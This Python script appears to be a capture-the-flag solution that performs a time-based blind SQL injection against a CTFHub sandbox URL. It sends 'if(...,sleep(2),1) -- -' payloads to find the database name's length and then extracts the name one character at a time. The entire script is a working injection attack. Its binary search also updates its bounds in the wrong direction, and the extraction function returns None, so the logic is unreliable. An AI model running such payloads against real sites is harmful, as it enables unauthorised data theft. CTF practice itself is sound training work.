import requests
session = requests.Session()


def get_length(l=1, r=10):
    while(l <= r):
        mid = l + r >> 1
        res = requests.get(
            f"http://challenge-e5f0a4cc16a727c1.sandbox.ctfhub.com:10800/?id=1 and if((length(database())={mid}),sleep(2),1) -- -")
        if(res.elapsed.total_seconds() > 2):
            return mid
        res = requests.get(
            f"http://challenge-e5f0a4cc16a727c1.sandbox.ctfhub.com:10800/?id=1 and if((length(database())>{mid}),sleep(2),1) -- -")
        if(res.elapsed.total_seconds() > 2):
            l = mid - 1
        else:
            r = mid + 1


def get_infO(length):
    result = ''
    for j in range(1, length+1):
        for i in range(32, 128):
            res = requests.get(
                f"http://challenge-e5f0a4cc16a727c1.sandbox.ctfhub.com:10800/?id=1 and if((ascii(substr((select database()),{j},1))={i}),sleep(2),1) -- -")
            if(res.elapsed.total_seconds() > 2):
                result += chr(i)
                print(result)
                break


print(get_infO(get_length()))
